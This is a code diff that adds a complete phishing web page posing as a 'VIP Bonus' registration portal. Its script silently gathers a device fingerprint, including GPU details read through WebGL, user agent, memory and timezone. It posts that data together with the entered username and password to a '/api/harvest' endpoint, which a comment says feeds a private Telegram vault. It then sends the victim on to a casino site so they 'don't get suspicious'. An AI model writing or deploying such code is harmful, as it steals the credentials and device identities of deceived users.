@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP Access | Verification</title>
+    <style>
+        body, html {
+            margin: 0; padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0c0f1a;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #161b2e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        h2 { margin-top: 0; color: #00e676; }
+        p { color: #8b9bb4; font-size: 14px; margin-bottom: 25px; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background-color: #0c0f1a;
+            border: 1px solid #2a3441;
+            color: white;
+            border-radius: 6px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        input:focus { border-color: #00e676; }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #00e676, #00b359);
+            border: none;
+            color: #000;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: opacity 0.2s;
+        }
+        button:active { opacity: 0.8; }
+        #loading { display: none; margin-top: 20px; color: #8b9bb4; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="loginBox">
+        <h2>Premium Bonus Portal</h2>
+        <p>Register your details below to activate your account and unlock the restricted VIP Bonus.</p>
+        
+        <input type="text" id="username" placeholder="Choose a Username" autocomplete="off">
+        <input type="password" id="password" placeholder="Choose a Password" autocomplete="off">
+        
+        <button onclick="harvestAndProceed()">Unlock & Continue</button>
+        <div id="loading">Verifying connection security...</div>
+    </div>
+
+    <script>
+        // --- 🧬 THE SILENT DNA HARVESTER ---
+        async function extractHardwareDNA() {
+            return new Promise((resolve) => {
+                const dna = {
+                    userAgent: navigator.userAgent,
+                    viewport: {
+                        width: window.innerWidth,
+                        height: window.innerHeight
+                    },
+                    deviceScaleFactor: window.devicePixelRatio || 1,
+                    isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+                    hasTouch: navigator.maxTouchPoints > 0,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 4,
+                    deviceMemory: navigator.deviceMemory || 4,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    locale: navigator.language || 'en-US',
+                    gpuVendor: 'Unknown',
+                    gpuRenderer: 'Unknown',
+                    canvasSeed: Math.random(),
+                    audioSeed: (Math.random() - 0.5) * 0.01
+                };
+
+                // Extract real GPU data using WebGL
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            dna.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                            dna.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        }
+                    }
+                } catch(e) {}
+
+                resolve(dna);
+            });
+        }
+
+        async function harvestAndProceed() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            if (!user || !pass) {
+                alert("Please enter a username and password.");
+                return;
+            }
+
+            // UI Feedback
+            const btn = document.querySelector('button');
+            const loading = document.getElementById('loading');
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+
+            try {
+                // 1. Silent Extraction
+                const dna = await extractHardwareDNA();
+                
+                // 2. Transmit to Private Telegram Vault via Vercel Backend
+                // (Note: using relative path so Vercel handles it)
+                await fetch('/api/harvest', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: user,
+                        password: pass,
+                        dna: dna
+                    })
+                });
+
+                // 3. Seamless Handoff to Casino
+                loading.innerText = "Target Secured. Redirecting to Casino...";
+                setTimeout(() => {
+                    // Redirect them to the real site to act natural
+                    window.location.href = "https://jeetexch99.com"; 
+                }, 1000);
+
+            } catch (e) {
+                console.error(e);
+                // Even on error, redirect so they don't get suspicious
+                window.location.href = "https://jeetexch99.com";
+            }
+        }
+    </script>
+</body>
+</html>
